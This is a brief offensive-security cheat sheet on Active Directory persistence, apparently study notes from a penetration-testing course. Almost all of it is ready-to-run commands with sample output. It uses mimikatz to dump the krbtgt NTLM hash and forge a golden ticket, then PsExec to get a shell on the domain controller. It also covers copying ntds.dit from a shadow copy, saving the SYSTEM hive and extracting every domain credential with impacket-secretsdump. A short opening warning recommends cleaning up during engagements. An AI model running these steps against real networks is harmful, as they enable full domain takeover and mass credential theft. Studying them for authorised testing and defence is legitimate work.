# AD Persistence

!!! warning "Watch out"
    Golden tickets and shadow copies are high-noise persistence mechanisms. In a real engagement, document and demonstrate rather than leaving active backdoors — clean up after yourself.

---

## Golden Ticket Persistence

### Extract the `krbtgt` Hash

```powershell
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch
```

Output:

```
RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : 1693c6cefafffc7af11ef34d1c788f47
```

### Forge a Golden Ticket

```powershell
mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

### Verify and Use

```powershell
klist
```

```powershell
.\PsExec.exe \\dc1 cmd.exe
```

---

## Shadow Copy Persistence

### Create a Shadow Copy

```powershell
C:\Tools\vshadow.exe -nw -p C:
```

Output:

```
- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

### Copy NTDS Database

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```

### Extract SYSTEM Hive

```powershell
reg.exe save hklm\system c:\system.bak
```

### Dump Credentials Offline

Transfer `ntds.dit.bak` and `system.bak` to the attacker machine, then:

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
